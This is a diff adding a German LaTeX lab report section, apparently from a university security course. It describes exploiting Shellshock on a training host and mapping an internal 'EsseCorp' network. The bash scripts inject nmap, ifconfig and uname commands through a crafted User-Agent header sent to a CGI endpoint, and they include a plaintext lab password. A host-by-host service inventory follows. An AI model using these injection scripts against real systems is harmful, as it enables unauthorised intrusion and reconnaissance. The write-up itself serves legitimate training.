@@ -89,6 +89,341 @@ Die Schwachstellen im System sind zum einen die Bash-Version (in neuen Versionen
 
 \section{Lab1b}
 
+\subsection{Vorgehensweise}
+
+\subsubsection{Einführung}
+
+Den Shellshock ausnützend wurden vom attackierten Host aus Befehle für das Sondieren des Netzwerks ausgeführt, unter anderem:
+\begin{itemize}
+	\item /sbin/ifconfig
+	\item /sbin/route
+	\item tracepath
+	\item /usr/sbin/arp
+	\item nmap
+\end{itemize}
+
+Anmerkung: Jene Befehle, welche nicht gleich erkannt wurden, wurden mit "whereis" gefunden.
+
+\subsubsection{Vorgehen}
+
+Zuerst haben wir die IPv4-Netze gescannt. Da ein Scan über die Netze 192.168.0.0/16 und 172.16.0.0/16 einen Timeout mit wget erzeugten, haben wir uns entschlossen, ein Shellscript zu schreiben, welches diese Aufgabe in mehrere kleine Scans zerlegt (Listing ~\ref*{code:scan1}).
+
+\begin{lstlisting}[caption=Scan der IPv4-Netze,label=code:scan1,language=bash,style=simple]
+	#!/bin/bash
+	for ((z=0;z<=255;z++))
+	do
+	ip="192.168."${z}".0/24"
+	file="net"${z}
+	cmd='wget -O '${file}' --user=user05 --password=d6/0g0Um1zlAmfYF6tA32Q== -U "() { test; }; echo \"Content-type: text/plain\"; echo; echo; nmap -sP '${ip}';" http://localhost:8805/cgi-bin/search'
+	echo ${cmd}
+	eval $cmd
+	done
+\end{lstlisting}
+
+Nach einigen erfolglosen Versuchen, die IPv6-Netze fdcb:172:16:2:1000::/120, fdcb:AC:10:2:1000::/120, fdcb:192:168:98:1000::/120 und fdcb:C0:A8:62:1000::/120 zu scannen sind wir auf die Idee gekommen, ein ifconfig auf dem attackierten Host auszuführen.
+
+Dabei sind wir auf die Tatsache gestoßen, dass der angegriffene Host sich im Netz fdcb:c447:e9d2:3553:1001:: befindet. Daher haben entsprechend diese Netze gescannt (Listing ~\ref*{code:scan2})
+
+
+\begin{lstlisting}[caption=Scan der IPv6-Netze,label=code:scan2,language=bash,style=simple]
+#!/bin/bash
+# variable "pres" als array deklarieren
+declare -a pres=("c447:e9d2:3553")
+
+for pre in ${pres[@]} 
+do
+for i in {0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f}
+do
+
+ips=""
+
+for j in $(seq 0 1 255)
+do
+
+# convert $j to hex
+hex=$(echo "obase=16; $j" | bc)
+
+# calculate IP
+ip="fdcb:${pre}:100${i}::${hex}"
+
+# add IP to list of IPs
+ips="${ips} ${ip}"
+
+done
+
+file="net6-${pre}-${i}"
+inCmd="nmap -6 -sP ${ips}"
+
+cmd='wget -O '${file}' --user=user05 --password=d6/0g0Um1zlAmfYF6tA32Q== -U "() { test; }; echo \"Content-type: text/plain\"; echo; echo;'${inCmd}';" http://localhost:8805/cgi-bin/search'
+
+echo "INJECTED COMMAND"
+echo "==="
+echo ${inCmd}
+echo "==="
+eval $cmd
+done
+done
+
+\end{lstlisting}
+
+Anschließend haben wir von den gefundenen Hosts die Ports mittels nmap -A -p- gescannt (Listing ~\ref*{code:pscan}).
+
+\begin{lstlisting}[caption=Portscan der gefundenen Hosts,label=code:pscan,language=bash,style=simple]
+#!/bin/bash
+# das 172er netz scannen
+for i in 12 15 25 253
+do
+ip="172.16.2.${i}"
+injCmd="nmap -A -p- ${ip}"
+file="host-${ip}"
+
+cmd='wget -O '${file}' --user=user05 --password=d6/0g0Um1zlAmfYF6tA32Q== -U "() { test; }; echo \"Content-type: text/plain\"; echo; echo; '${injCmd}';" http://localhost:8805/cgi-bin/search'
+
+eval $cmd
+done
+
+# das 192er netz scannen
+for i in 1 5 22 54 99 124 201 202
+do
+ip="192.168.98.${i}"
+injCmd="nmap -A -p- ${ip}"
+file="host-${ip}"
+
+cmd='wget -O '${file}' --user=user05 --password=d6/0g0Um1zlAmfYF6tA32Q== -U "() { test; }; echo \"Content-type: text/plain\"; echo; echo; '${injCmd}';" http://localhost:8805/cgi-bin/search'
+
+eval $cmd
+done
+
+# das 1001er netz scannen
+for i in 1 5 9 21 43 79 88 ab
+do
+ip="fdcb:c447:e9d2:3553:1001::${i}"
+injCmd="nmap -6 -A -p- ${ip}"
+file="host6-${ip}"
+
+cmd='wget -O '${file}' --user=user05 --password=d6/0g0Um1zlAmfYF6tA32Q== -U "() { test; }; echo \"Content-type: text/plain\"; echo; echo; '${injCmd}';" http://localhost:8805/cgi-bin/search'
+
+eval $cmd
+done
+
+# das 1002er netz scannen
+for i in fd fe
+do
+ip="fdcb:c447:e9d2:3553:1002::${i}"
+injCmd="nmap -6 -A -p- ${ip}"
+file="host6-${ip}"
+
+cmd='wget -O '${file}' --user=user05 --password=d6/0g0Um1zlAmfYF6tA32Q== -U "() { test; }; echo \"Content-type: text/plain\"; echo; echo; '${injCmd}';" http://localhost:8805/cgi-bin/search'
+
+eval $cmd
+done
+
+# das 1003er netz scannen
+for i in 7f 9a da
+do
+ip="fdcb:c447:e9d2:3553:1003::${i}"
+injCmd="nmap -6 -A -p- ${ip}"
+file="host6-${ip}"
+
+cmd='wget -O '${file}' --user=user05 --password=d6/0g0Um1zlAmfYF6tA32Q== -U "() { test; }; echo \"Content-type: text/plain\"; echo; echo; '${injCmd}';" http://localhost:8805/cgi-bin/search'
+
+eval $cmd
+done
+\end{lstlisting}
+
+Schlussendlich haben wir noch Befehle wie route, tracepath und tracepath6 verwendet, um einen besseren Überblick über die Topologie zu bekommen (Im Stile von Listing ~\ref*{code:restscript}).
+
+\begin{lstlisting}[caption=Scan der IPv4-Netze,label=code:restscript,language=bash,style=simple]
+file="uname"
+inCmd="/bin/uname -a"
+cmd='wget -O '${file}' --user=user05 --password=d6/0g0Um1zlAmfYF6tA32Q== -U "() { test; }; echo \"Content-type: text/plain\"; echo; echo;'${inCmd}';" http://localhost:8805/cgi-bin/search'
+
+echo "INJECTED COMMAND"
+echo "==="
+echo ${inCmd}
+echo "==="
+eval $cmd
+\end{lstlisting}
+
+Dabei hat sich vor allem ergeben, dass der Host mit Namen SUN der zentrale Gateway im Netzwerk ist und unser Einstiegshost EARTH ist (I see what you did there).
+
+\subsection{Netzwerke und Hosts}
+
+\subsubsection{172.16.2.0}
+Alle Hosts in diesem Netz liegen in der Domain dmz.vienna.essecorp.invalid.
+\begin{itemize}
+	\item 172.16.2.12: pluto
+	\\Dienste: HTTP (lighttpd 1.4.31) auf Port 80, Titel: EsseCorp Inc.
+	\\Geschätztes OS: Unix
+	\\Geschätzte Rolle: HTTP-Server
+	
+	\item 172.16.2.15: charon
+	\\Dienste: FTP (vsftpd 2.3.5) auf Port 21
+	\\Geschätztes OS: Unix (Exim smtpd ist nur auf Unixoiden OS vorhanden; auch von nmap geschätzt)
+	\\Geschätzte Rolle: FTP-Server
+	
+	\item 172.16.2.25: eris
+	\\Dienste: SMTP (Exim smtpd 4.80) auf Port 25
+	\\Geschätztes OS: Unix (Exim smtpd ist nur auf Unixoiden OS vorhanden)
+	\\Geschätzte Rolle: Mail-Server
+	
+	\item 172.16.2.253: makemake
+	\\Dienste: Filtered SSH auf Port 22
+	\\Geschätztes OS: Unix
+	\\Geschätzte Rolle: Produktions-Server oder Netzwerk-Gerät
+\end{itemize}
+
+\subsubsection{192.168.98.0}
+Alle Hosts in diesem Netz liegen in der Domain local.vienna.essecorp.invalid.
+\begin{itemize}
+	\item 192.168.98.1: sun
+	\\Dienste: filtered ssh auf Port 22
+	\\Geschätztes OS: Cisco IOS/anderes Router-OS
+	\\Geschätzte Rolle: Gateway
+	
+	\item 192.168.98.5: venus
+	\\Dienste: DNS (dnsmasq 2.62) auf Port 53
+	\\Geschätztes OS: Unix (dnsmasq ist nur auf Unixoiden OS verfügbar)
+	\\Geschätzte Rolle: DNS-Server
+	
+	\item 192.168.98.22: saturn
+	\\Dienste: SMTP (Exim smtpd 4.80) auf Port 25
+	\\POP3 (Dovecot pop3d) auf Port 110
+	\\IMAP (Dovecot imapd) auf Port 143
+	\\Geschätztes OS: Unix (Dovecot ist nur auf Unixoiden OS verfügbar)
+	\\Geschätzte Rolle: Mail-Server
+	
+	\item 192.168.98.54: mars
+	\\Dienste: SOCKS5 auf Port 1080
+	\\Geschätztes OS: Unix
+	\\Geschätzte Rolle: Proxy
+	
+	\item 192.168.98.99: jupiter
+	\\Dienste: IPP (CUPS 1.5) auf Port 631
+	\\Geschätztes OS: Unix
+	\\Geschätzte Rolle: Drucker(-Server)
+	
+	\item 192.168.98.124: earth
+	\\Dienste: SSH (OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)) auf Port 22
+	\\HTTP (Apache httpd 2.2.22 ((Debian))) auf Port 8801 - 8840
+	\\Geschätztes OS: Linux (Debian)
+	\\Geschätzte Rolle: Webserver
+	
+	\item 192.168.98.201: neptune
+	\\Dienste: netbios-ssn (Samba smbd 3.X (workgroup: ESSECORP)) auf Port 139
+	\\netbios-ssn (Samba smbd 3.X (workgroup: ESSECORP)) auf Port 445
+	\\Geschätztes OS: Unix (samba 3.6.6)
+	\\Geschätzte Rolle: File-Sharing-Server
+	
+	\item 192.168.98.202: mercury
+	\\Dienste: N/A
+	\\Geschätztes OS: N/A
+	\\Geschätzte Rolle: Workstation
+	
+\end{itemize}
+
+\subsubsection{fdcb:c447:e9d2:3553:1001::}
+Alle Hosts in diesem Netz liegen in der Domain local.vienna.essecorp.invalid.
+Anmerkung: Die Hosts in diesem Netz sind mit hoher Wahrscheinlichkeit dieselben Hosts wie im Netz 192.168.98.0, nur mit ihren konfigurierten IPv6-Adressen.\\
+Die einzige Änderung bezüglich Diensten liegt beim Host MARS vor.
+\begin{itemize}
+	\item fdcb:c447:e9d2:3553:1001::1: sun
+	\\Dienste: filtered ssh auf Port 22
+	\\Geschätztes OS: Cisco IOS/anderes Router-OS
+	\\Geschätzte Rolle: Gateway
+	
+	\item fdcb:c447:e9d2:3553:1001::5: venus
+	\\Dienste: DNS (dnsmasq 2.62) auf Port 53
+	\\Geschätztes OS: Unix (dnsmasq ist nur auf Unixoiden OS verfügbar)
+	\\Geschätzte Rolle: DNS-Server
+	
+	\item fdcb:c447:e9d2:3553:1001::9: saturn
+	\\Dienste: SMTP (Exim smtpd 4.80) auf Port 25
+	\\POP3 (Dovecot pop3d) auf Port 110
+	\\IMAP (Dovecot imapd) auf Port 143
+	\\Geschätztes OS: Unix (Dovecot ist nur auf Unixoiden OS verfügbar)
+	\\Geschätzte Rolle: Mail-Server
+	
+	\item fdcb:c447:e9d2:3553:1001::21: mars
+	\\Dienste: HTTP-Proxy (Tinyproxy 1.8.3) auf Port 8080
+	\\Geschätztes OS: Unix
+	\\Geschätzte Rolle: Proxy
+	
+	\item fdcb:c447:e9d2:3553:1001::43: jupiter
+	\\Dienste: IPP (CUPS 1.5) auf Port 631
+	\\Geschätztes OS: Unix
+	\\Geschätzte Rolle: Drucker(-Server)
+
+	\item fdcb:c447:e9d2:3553:1001::79: neptune
+	\\Dienste: netbios-ssn (Samba smbd 3.X (workgroup: ESSECORP)) auf Port 139
+	\\netbios-ssn (Samba smbd 3.X (workgroup: ESSECORP)) auf Port 445
+	\\Geschätztes OS: Unix (samba 3.6.6)
+	\\Geschätzte Rolle: File-Sharing-Server
+	
+	\item fdcb:c447:e9d2:3553:1001::88: mercury
+	\\Dienste: N/A
+	\\Geschätztes OS: N/A
+	\\Geschätzte Rolle: Workstation
+		
+	\item fdcb:c447:e9d2:3553:1001::ab: earth
+	\\Dienste: SSH (OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)) auf Port 22
+	\\HTTP (Apache httpd 2.2.22 ((Debian))) auf Port 8801 - 8840
+	\\Geschätztes OS: Linux (Debian)
+	\\Geschätzte Rolle: Webserver
+\end{itemize}
+
+\subsubsection{fdcb:c447:e9d2:3553:1002::}
+Alle Hosts in diesem Netz liegen in der Domain dmz.vienna.essecorp.invalid.
+Anmerkung: makemake ist wahscheinlich derselbe Host wie makemake aus dem Netz 172.16.2.0.
+\begin{itemize}
+	\item fdcb:c447:e9d2:3553:1002::fd: makemake
+	\\Dienste: Filtered SSH auf Port 22
+	\\Geschätztes OS: Unix
+	\\Geschätzte Rolle: Produktions-Server oder Netzwerk-Gerät
+	
+	\item fdcb:c447:e9d2:3553:1002::fe: tauceti
+	\\Dienste: Filtered SSH auf Port 22
+	\\Geschätztes OS: Unix
+	\\Geschätzte Rolle: Produktions-Server oder Netzwerk-Gerät
+\end{itemize}
+
+\subsubsection{fdcb:c447:e9d2:3553:1003::}
+Alle Hosts in diesem Netz liegen in der Domain extra.vienna.essecorp.invalid.
+\begin{itemize}
+	\item fdcb:c447:e9d2:3553:1003::7f: sirius
+	\\Dienste: HTTP (lighttp 1.4.31) auf Port 80, Titel: EsseCorp Extranet
+	\\HTTP (lighttp 1.4.31) auf Port 443, Titel: EsseCorp Extranet
+	\\Geschätztes OS: Unix
+	\\Geschätzte Rolle: Web-Server
+	
+	\item fdcb:c447:e9d2:3553:1003::9a: procyon
+	\\Dienste: echo auf Port 7
+	\\discard auf Port 9
+	\\daytime auf Port 13
+	\\chargen (Linux chargen) auf Port 19
+	\\SSH (OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)) auf Port 22
+	\\time auf Port 37
+	\\Geschätztes OS: Linux (Debian)
+	\\Geschätzte Rolle: Test-Server (bzw. Server für alles)
+	
+	\item fdcb:c447:e9d2:3553:1003::da: tauceti
+	\\Dienste: filtered ssh auf Port 22
+	\\Geschätztes OS: Unix
+	\\Geschätzte Rolle: Produktions-Server oder Netzwerk-Gerät
+	
+\end{itemize}
+
+\subsection{Topologie}
+Anmerkung: Für jeden Host wurde maximal eine IP-Adresse angegeben (Abb. \ref*{fig:topology}).
+\begin{figure}[h!]
+	\centering
+	\fbox{
+		\includegraphics[width=1\textwidth]{./imgs/lab1.png}
+	}
+	\caption{Topologie}
+	\label{fig:topology}
+\end{figure}
+
 \section{Lab1c}
 
 \subsection{app0}
